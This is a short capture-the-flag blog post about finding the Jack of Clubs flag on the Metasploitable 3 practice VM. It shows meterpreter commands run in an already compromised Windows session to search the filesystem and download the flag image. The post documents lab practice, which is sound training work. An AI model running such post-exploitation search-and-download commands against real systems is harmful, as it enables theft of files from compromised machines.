---
layout: post
title: "The Jack of Clubs"
date: 2016-12-09T00:55:00Z
author: gu4r15sm0
category: metasploitable
tags: [metasploitable3, ctf, cards]
---

## Metasploitable 3

### The Jack of clubs

Remember I found this while troubleshooting the Queen of Hearts issue?


```bash
meterpreter > search -f jack\*.png
Found 3 results...
    C:\jack_of_diamonds.png
    C:\Windows\System32\jack_of_clubs.png (523644 bytes)
    C:\vagrant\resources\flags\jack_of_clubs.png (523644 bytes)
```


Let's go download it


```bash
meterpreter > cd Windows
meterpreter > cd System32
meterpreter > pwd
C:\Windows\System32

meterpreter > download C:\Windows\System32\jack_of_clubs.png
```

[\*] downloading: jack_of_clubs.png -> jack_of_clubs.png
[\*] download   : jack_of_clubs.png -> jack_of_clubs.png
```


[![](/assets/images/jack_of_clubs.jpg)](/assets/images/jack_of_clubs.jpg)

Done!